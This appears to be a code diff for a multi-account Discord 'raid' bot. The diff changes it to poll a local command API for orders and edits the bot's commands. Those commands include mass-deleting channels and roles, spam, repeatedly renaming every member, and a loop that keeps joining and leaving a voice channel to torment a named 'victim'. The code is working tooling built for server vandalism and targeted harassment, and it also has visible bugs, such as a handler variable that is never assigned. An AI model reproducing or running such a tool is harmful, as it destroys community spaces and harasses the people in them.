@@ -1,84 +1,64 @@
 process.stdout.write('\x1Bc')
 
-let connectedBots = [];
-
 // Variables
-const raidDir = './raidData'
-const genDir = './genData'
+const raidDir = '../raidData'
+const genDir = '../genData'
 
-const { Client, Intents } = require('discord.js');
-const { joinVoiceChannel } = require('@discordjs/voice');
+import fetch from 'node-fetch'
 
-const dotaShit = require(`${genDir}/dotaShit.json`)
-const animeShit = require(`${genDir}/animeShit.json`)
-const shutUp = require(`${genDir}/SHUT_UP.json`)
+import { Client, Intents } from 'discord.js'
+import { joinVoiceChannel } from '@discordjs/voice'
 
-const TOKENS = require(`${raidDir}/TOKENS.json`)
-const BOTS = require(`${raidDir}/BOTS.json`)
-const GUILDS = require(`${raidDir}/RAIDED_GUILDS.json`)
-const IGNORE_CHANNELS = require(`${raidDir}/IGNORE_CHANNELS.json`)
+import dotaShit from '../genData/dotaShit.json' assert {type: 'json'}
+import animeShit from '../genData/animeShit.json' assert {type: 'json'}
+import shutUp from '../genData/SHUT_UP.json' assert {type: 'json'}
 
-const utils = require('./utils.js');
+import GUILDS from '../raidData/RAIDED_GUILDS.json' assert {type: 'json'}
+import IGNORE_CHANNELS from '../raidData/IGNORE_CHANNELS.json' assert {type: "json"}
 
-// [start] Input handler
-const Prompt = require('serverline')
+import utils from '../utils.js'
 
-Prompt.init()
-Prompt.setCompletion(
-    [
-        'help',
-        'createChannels',
-        'createRoles',
-        'deleteChannels',
-        'deleteRoles',
-        'tormentWithSound'
-    ])
+const API = 'http://localhost:4000/commands'
+const DELAY = 1000
 
-let lastCommand = ''
-
-Prompt.on('line', (line) => {
-
-    switch (line) {
-        case 'help':
-            console.log(
-                'createChannels amount:int\n' +
-                'createRoles amount:int\n' +
-                'deleteChannels\n' +
-                'deleteRoles\n' +
-                'tormentWithSound id:int'
-            )
-        default:
-            const lineFirstWord = line.split(' ')[0]
-
-            if (!(lineFirstWord in connectedBots[0])) {
-                console.warn(`Undefined option: ${lineFirstWord}, type help for more info`)
-                break
-            }
-
-            for (let botHandler of connectedBots) {
-                botHandler[lineFirstWord](line)
-            }
-    }
-
-    lastCommand = line
-
-    if (Prompt.isMuted()) {
-        Prompt.setMuted(false)
-    }
-
-})
-
-Prompt.on('SIGINT', function (rl) {
-    rl.question('Confirm exit: ', (answer) => answer.match(/^y(es)?$/i) ? process.exit(0) : rl.output.write('\x1B[1K> '))
-})
-// [end] Input handler
+let commandHanlder
 
 function launch(token, delay) {
     const allIntents = new Intents(32767);
     const client = new Client({ intents: allIntents });
 
+    let lastTime = 0
+
     client.on('ready', () => {
         console.log(`Logged in as ${client.user.tag}!`);
+
+        setInterval(() => {
+            fetch(API)
+                .then(async (response) => {
+                    let data = await response.text()
+                    data = JSON.parse(data)
+
+                    let option = data.command
+                    let firstWord = option.split(' ')[0]
+                    let time = data.time
+
+                    if (lastTime === time) {
+                        return
+                    }
+
+                    lastTime = time
+
+                    if (!(firstWord in commandHanlder)) {
+                        console.warn(`Undefined options: ${firstWord}, type help for more info`)
+                        return
+                    }
+
+                    command[firstWord](option)
+                })
+                .catch((err) => {
+                    console.warn(err)
+                })
+        }, DELAY)
     });
 
     let command = {
@@ -107,6 +87,7 @@ function launch(token, delay) {
 
             utils.changeAllNicks(guildMembers, delay, animeShit)
         },
+
         'changeNicksInf': (message) => {
             const base = command.options(message);
             const guildMembers = base.guild.members.cache
@@ -114,6 +95,13 @@ function launch(token, delay) {
             setInterval(() => {
                 utils.changeAllNicks(guildMembers, delay, animeShit)
             }, 100)
+        },
+        'changeNicks1': (message) => {
+            const base = command.options(message);
+            const guildMembers = base.guild.members.cache
+            const nickname = base.options[1]
+
+            utils.changeAllNicks(guildMembers, delay, [nickname])
         },
         'createChannels': (message) => {
             const base = command.options(message);
@@ -180,8 +168,7 @@ function launch(token, delay) {
                         .catch(error => {
                             // console.warn('Something wrong', '[deleteRoles]')
                         })
-                }, 200
-                )
+                }, 200)
             }
         },
         'spam': (message) => {
@@ -202,17 +189,22 @@ function launch(token, delay) {
             const base = command.options(message)
             const victim = base.options[1]
 
-            const channel = base.guild.channels.cache.get("721854300707487774")
+            // const channel = base.guild.channels.cache.get("721854300707487774")
+            const channel = client.channels.cache.get("723290894391967848")
 
             setInterval(() => {
-                let connection = joinVoiceChannel({
-                    channelId: channel.id,
-                    guildId: channel.guild.id,
-                    adapterCreator: channel.guild.voiceAdapterCreator,
-                })
+                setTimeout(() => {
+                    joinVoiceChannel({
+                        channelId: channel.id,
+                        guildId: channel.guild.id,
+                        adapterCreator: channel.guild.voiceAdapterCreator,
+                    })
+                }, 500 + delay)
 
-                connection.destroy()
-            }, delay / 10)
+                setTimeout(() => {
+                    utils.exitVoiceChannel(channel.guild.id)
+                }, 900 + delay)
+            }, 1200 + delay)
         }
     }
 
@@ -229,7 +221,7 @@ function launch(token, delay) {
 
             channel.send(`[${firstWord}] successfully executed`);
         }
-        else if (message.content.indexOf('^') === -1){
+        else if (message.content.indexOf('^') === -1) {
             channel.send(utils.getRandomItem(shutUp));
         }
     });
@@ -237,16 +229,6 @@ function launch(token, delay) {
     client.login(token);
 
     return command
-}
-
-let delay = 800;
-for (let nickname in TOKENS) {
-    const token = TOKENS[nickname]
-    let commandHanlder = launch(token, delay)
-
-    connectedBots.push(commandHanlder)
-
-    delay += 500;
 }
 
 
